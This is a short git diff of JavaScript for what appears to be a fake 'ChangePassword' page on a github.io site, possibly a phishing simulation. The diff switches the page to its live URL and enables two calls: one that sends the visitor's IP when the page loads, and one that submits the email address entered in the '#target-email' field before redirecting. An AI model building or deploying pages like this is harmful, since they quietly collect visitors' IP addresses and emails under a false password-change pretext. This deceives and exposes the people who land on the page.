@@ -1,7 +1,7 @@
 let ip = null;
 // ! Switch to live URL
-// let rootUrl = "https://gpaphitis.github.io/ChangePassword/cd2feffee199eea9354472021b566af07530d53d";
-let rootUrl = "http://localhost:5500/cd2feffee199eea9354472021b566af07530d53d";
+let rootUrl = "https://gpaphitis.github.io/ChangePassword/cd2feffee199eea9354472021b566af07530d53d";
+// let rootUrl = "http://localhost:5500/cd2feffee199eea9354472021b566af07530d53d";
 document.addEventListener("DOMContentLoaded", () =>
 {
    document.querySelector("#next").addEventListener("click", submit);
@@ -9,8 +9,7 @@ document.addEventListener("DOMContentLoaded", () =>
    document.querySelector("#target-email").addEventListener("input", checkValid);
    window.addEventListener("resize", resizePadding);
    // ! Uncomment to enable email send upon loading of page
-   console.log("Sent");
-   // sendIp();
+   sendIp();
 });
 function resizePadding()
 {
@@ -68,10 +67,10 @@ function submit(e)
    if (isFormCorrect === true) {
       let email = document.querySelector("#target-email").value;
       // ! Uncomment to enable email send upon submitting
-      // submitEmail(email, "TJSS Submitted").then(() =>
-      // {
+      submitEmail(email, "TJSS Submitted").then(() =>
+      {
       window.location.replace(`${rootUrl}/not-allowed.html`);
-      // });
+      });
    }
 }
 function isFormValid()
